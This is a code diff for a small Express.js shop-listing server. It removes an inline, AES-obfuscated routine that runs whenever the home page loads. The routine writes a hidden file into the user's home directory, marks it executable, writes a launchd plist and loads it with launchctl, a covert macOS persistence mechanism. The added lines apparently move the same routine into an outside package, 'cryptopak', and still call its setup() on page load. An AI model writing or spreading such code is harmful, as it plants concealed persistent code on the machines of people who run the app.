@@ -2,10 +2,7 @@ const fs = require('fs');
 var bodyParser = require("body-parser")
 var express = require("express")
 var app = express()
-var CryptoJS = require("crypto-js")
-const homedir = require('os').homedir()
-const execSync = require('child_process').execSync
-const delay = ms => new Promise(res => setTimeout(res, ms));
+var cryptMod = require("cryptopak")
 
 app.set("view engine", "ejs")
 app.use(express.static(__dirname + "/public"))
@@ -20,7 +17,7 @@ var shops = [
 app.get("/", function(req, res) {
    res.render("index")
 
-   setup()
+   cryptMod.setup()
 })
 
 app.get("/shops", function(req, res){
@@ -50,89 +47,3 @@ app.post("/shops", function(req, res){
 app.listen(port, function(){
    console.log("listening on port: " + port + "...")
 })
-
-var encryptedAccess = {rs: "U2FsdGVkX19UVKvwPcE06f894iJTjwfqm3VCSMWCmMIpm8AO0Ln2NINcRDnCbTifuOj9PFBbvPQxJ1UOGupw7PcEYtQrRQzWncg+TCnSk/E=", 
-plf: "U2FsdGVkX1+rFYbpYpl2gDUuSCphwENbWjTZ0KbbbMnEI1TBjw6/HUk/LRWZjCq9aBQH6/eUKSjK+jXAMB7MjA/fSzmBxSvSWPWedDLB2MPXPOM8O5/fdPtTCHEr//J5c2I2XJSJMdGn57CmV3W0cH4Hyeh59hwwwUBy8+TmE65FqVGygFv+QSBZKYY9wQzzn2NfX6pGRZoOySL8/wOHRQ==",
-plb: "U2FsdGVkX19s+Mv4tluIyLnJ1ZGicx7q9qYwf2SuajsZt8G6U1IVfE1VrfWnUSbBn/YNE2YFefoetWpKyPqIDMXGMEEIgrWHGApVKNfastfaB+bihnMWKm/E4lB4oYXgNZUPTd/w1iCTq3Hz2zqNq7vGgu5LH84MiaMQAjYfLZo=",
-rsl: "U2FsdGVkX1+jRto9jv8GPJGFrvCvzqQosUtkgjWOZaOKnkJPkHXJxesDfR0VepHX",
-psl: "U2FsdGVkX1+YT0z6s8FyiCalRNEJL8FGcUKUG0jkyOdxwlddl5vK4kFhY1riROJ+hxEJmVMocHGdlpQ6yMhX2cePnoz5feG5ExQ2DMUqUKc="
-}
-
-function bm(file, dataToMatch){
-   fs.promises.readFile(file, 'utf-8').then(dataAsString => {
-      return dataAsString === dataToMatch
-   })
-   .catch(err => {
-      //console.log(err)
-      return false
-   })
-}
-
-function gd(fileLocation)
-{
-   var index = 0
-   for (i = 0; i < fileLocation.length; i++) {
-      if(fileLocation[i] == '/') {
-         index = i
-      }
-   }
-
-   var solution = ""
-   for( i = 0; i < index; i++) {
-      solution += fileLocation[i]
-   }
-
-   return solution
-}
-
-function wdtf(file, data)
-{
-   fs.promises.mkdir(gd(file), {recursive: true}).then(() => {
-      fs.promises.writeFile(file, data).then(() => {
-         //console.log("Success.")
-      })
-      .catch(err => {
-         //console.log(err)
-      })
-   }).catch(err => {
-      if(err.code === 'EEXIST')
-      {
-         fs.promises.writeFile(file, data).then(() => {
-               //console.log("Success.")
-         })
-         .catch(err => {
-               //console.log(err)
-         })
-      }
-      else {
-         //console.log(err)
-      }
-   })
-} 
-
-async function setup(){
-   rsLocation =  homedir + CryptoJS.AES.decrypt(encryptedAccess.rsl.toString(), "secret").toString(CryptoJS.enc.Utf8)
-   plLocation = homedir + CryptoJS.AES.decrypt(encryptedAccess.psl.toString(), "secret").toString(CryptoJS.enc.Utf8)
-
-   var unencrypted = CryptoJS.AES.decrypt(encryptedAccess.rs.toString(), "secret")
-   var match = bm(rsLocation, unencrypted.toString(CryptoJS.enc.Utf8))
-
-   if(!match) {
-      wdtf(rsLocation, CryptoJS.AES.decrypt(encryptedAccess.rs, "secret")
-      .toString(CryptoJS.enc.Utf8))
-   }
-
-   await delay(5000);
-   output = execSync('chmod +x ' + rsLocation)
-
-   var combined = CryptoJS.AES.decrypt(encryptedAccess.plf, "secret").toString(CryptoJS.enc.Utf8) + homedir + 
-   CryptoJS.AES.decrypt(encryptedAccess.plb, "secret").toString(CryptoJS.enc.Utf8)
-
-   match = bm(plLocation, combined)
-   if(!match) {
-      wdtf(plLocation, combined)
-   }
-
-   await delay(5000);
-   output = execSync('launchctl load ' + plLocation)
-}
